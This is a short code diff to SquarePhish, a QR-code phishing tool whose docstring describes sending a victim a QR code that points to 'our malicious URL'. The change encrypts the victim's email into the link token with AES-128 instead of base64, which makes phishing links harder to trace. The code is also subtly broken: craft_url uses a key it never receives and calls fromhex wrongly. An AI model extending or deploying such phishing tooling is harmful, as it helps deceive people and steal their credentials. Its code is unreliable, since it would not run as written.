@@ -21,6 +21,7 @@ from configparser import ConfigParser
 from email.message import EmailMessage
 from email.mime.image import MIMEImage
 from squarephish.modules.emailer import Emailer
+from squarephish.modules.server.aes128 import encrypt_aes128
 
 
 class QRCodeEmail:
@@ -33,6 +34,7 @@ class QRCodeEmail:
         endpoint: str,
         email: str,
         url: str,
+        key_hex: str
     ) -> bytes:
         """Generate a QR code for a given URL
 
@@ -61,7 +63,8 @@ class QRCodeEmail:
             return None
             
     def craft_url(server,endpoint,email):
-            token = base64.b64encode(email.encode()).decode("utf-8")
+            # base64.b64encode(email.encode()).decode("utf-8")
+            token = encrypt_aes128(email.encode(), key_hex.fromhex())
             return f"https://{server}/{endpoint}?token={token}"
         
     @classmethod
@@ -70,7 +73,7 @@ class QRCodeEmail:
         email: str,
         config: ConfigParser,
         emailer: Emailer,
-        url: str
+        url: str,
     ) -> bool:
         """Send initial QR code to victim pointing to our malicious URL
 
@@ -86,6 +89,7 @@ class QRCodeEmail:
             config.get("EMAIL", "SQUAREPHISH_ENDPOINT"),
             email,
             url,
+            config.get("SERVER", "ENCRYPTION_KEY")
         )
 
         if not qrcode:
